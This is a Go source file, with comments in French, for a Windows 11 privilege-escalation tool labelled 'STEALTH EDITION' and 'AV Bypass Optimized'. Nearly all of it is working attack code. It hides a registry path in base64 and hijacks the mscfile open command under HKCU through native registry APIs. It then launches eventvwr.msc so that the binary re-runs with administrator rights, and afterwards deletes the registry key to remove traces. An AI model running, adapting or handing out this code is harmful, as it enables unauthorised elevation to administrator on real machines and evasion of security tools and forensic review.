//go:build windows

package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"time"
	"unsafe"
)

// --- OBFUSCATION DES CHAINES ---
var (
	// "Software\\Classes\\mscfile\\shell\\open\\command"
	k1 = "U29mdHdhcmVcQ2xhc3Nlc1xtc2NmaWxlXHNoZWxsXG9wZW5cY29tbWFuZA=="
)

func decode(s string) string {
	d, _ := base64.StdEncoding.DecodeString(s)
	return string(d)
}

// --- DLL ET APIS NATIVES ---
var (
	advapi32         = syscall.NewLazyDLL("advapi32.dll")
	procRegCreateKey = advapi32.NewProc("RegCreateKeyExW")
	procRegSetValue  = advapi32.NewProc("RegSetValueExW")
	procRegCloseKey  = advapi32.NewProc("RegCloseKey")
	procRegDeleteKey = advapi32.NewProc("RegDeleteTreeW")

	shell32          = syscall.NewLazyDLL("shell32.dll")
	procShellExecute = shell32.NewProc("ShellExecuteW")
)

// ShellExecuteW : Utilisation de l'API Windows pour contourner CreateProcess() restrictions
func ShellExecute(verb, file string) {
	v, _ := syscall.UTF16PtrFromString(verb)
	f, _ := syscall.UTF16PtrFromString(file)
	// On lance le fichier .msc de manière invisible
	procShellExecute.Call(0, uintptr(unsafe.Pointer(v)), uintptr(unsafe.Pointer(f)), 0, 0, 0)
}

// CheckAdmin : Vérifie si le processus actuel possède les privilèges Administrateur
func CheckAdmin() bool {
	cmd := exec.Command("net", "session")
	err := cmd.Run()
	return err == nil
}

// SetRegistryValue : Modifie le registre via API Native pour rester invisible (Pas de reg.exe)
func SetRegistryValue(keyPath, value string) error {
	var hKey syscall.Handle
	kPtr, _ := syscall.UTF16PtrFromString(keyPath)

	ret, _, _ := procRegCreateKey.Call(
		uintptr(syscall.HKEY_CURRENT_USER),
		uintptr(unsafe.Pointer(kPtr)),
		0, 0, 0,
		uintptr(0xF003F), // KEY_ALL_ACCESS
		0,
		uintptr(unsafe.Pointer(&hKey)),
		0,
	)
	if ret != 0 {
		return fmt.Errorf("RegCreateKeyEx failed: %d", ret)
	}
	defer procRegCloseKey.Call(uintptr(hKey))

	vPtr, _ := syscall.UTF16PtrFromString(value)
	vLen := uint32(len(syscall.StringToUTF16(value)) * 2)

	procRegSetValue.Call(
		uintptr(hKey),
		0, // Valeur (Default)
		0,
		uintptr(1), // REG_SZ
		uintptr(unsafe.Pointer(vPtr)),
		uintptr(vLen),
	)
	return nil
}

// ExploitStealth : Réalise un bypass de l'UAC via EventVwr et Native Registry API
func ExploitStealth() bool {
	fmt.Println("[*] Phase 1 : Hijacking silencieux via API Native...")

	selfPath, _ := os.Executable()
	keyPath := decode(k1)

	// Étape 1 : Modification invisible du registre
	err := SetRegistryValue(keyPath, selfPath)
	if err != nil {
		fmt.Printf("[-] Erreur Registry API : %v\n", err)
		return false
	}

	fmt.Println("[*] Phase 2 : Déclenchement via ShellExecute (Indétectable)...")

	// Étape 2 : On demande à Windows d'ouvrir le gestionnaire d'événements.
	// Windows va chercher comment ouvrir les fichiers .msc, trouver notre hijack
	// et lancer ce binaire avec les privilèges Administrateur.
	ShellExecute("open", "eventvwr.msc")

	fmt.Println("[*] Phase 3 : Nettoyage instantané des traces...")
	time.Sleep(3 * time.Second)

	kBase, _ := syscall.UTF16PtrFromString("Software\\Classes\\mscfile")
	procRegDeleteKey.Call(uintptr(syscall.HKEY_CURRENT_USER), uintptr(unsafe.Pointer(kBase)))

	return true
}

func main() {
	fmt.Println("====================================================")
	fmt.Println("   Windows 11 PRIVESC [STEALTH EDITION v8.1]")
	fmt.Println("   Target: Build 22631.6199 (AV Bypass Optimized)")
	fmt.Println("   Technique: API Native + MSC Hijack")
	fmt.Println("====================================================")

	if CheckAdmin() {
		fmt.Println("\n[+] ############################################")
		fmt.Println("[+] #     SUCCÈS : ÉLÉVATION DÉTECTÉE !        #")
		fmt.Println("[+] ############################################")
		fmt.Println("\n[*] Privilèges : SYSTEM / Administrator")

		fmt.Println("\nAppuyez sur Entrée pour quitter...")
		var input string
		fmt.Scanln(&input)
		return
	}

	fmt.Println("[!] État actuel : UTILISATEUR LIMITÉ")
	fmt.Println("[*] Tentative d'escalade furtive en cours...")

	if ExploitStealth() {
		fmt.Println("\n[+] Injection réussie. En attente du processus élevé...")
	} else {
		fmt.Println("[-] ÉCHEC : L'opération a été bloquée.")
	}

	fmt.Println("\nAppuyez sur Entrée pour quitter...")
	var input string
	fmt.Scanln(&input)
}
